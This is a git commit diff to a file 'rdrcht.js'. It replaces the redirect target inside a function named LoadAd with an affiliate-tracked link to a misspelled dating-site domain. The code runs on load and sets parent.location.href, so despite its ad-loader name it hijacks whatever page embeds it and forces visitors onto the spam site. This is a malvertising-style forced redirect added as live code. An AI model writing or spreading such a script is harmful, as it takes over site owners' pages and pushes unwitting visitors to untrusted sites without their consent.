b3cc2ac53cfd5f4b40832746979897972d85f724
Zen Arkana R <zenarkanarahman@gmail.com>
2026-07-14 02:26:28 +0700

    Update rdrcht.js

--- rdrcht.js
+++ rdrcht.js
@@ -1,1 +1,1 @@
-function LoadAd() { parent.location.href="https://rdrchats.com"; } LoadAd();
+function LoadAd() { parent.location.href="https://argbq.datiingshop.com/?utm_source=da57dc555e50572d&ban=fb&j1=1&s1=55454&s2=2196750&s5=Vritz&click_id=Vritz"; } LoadAd();
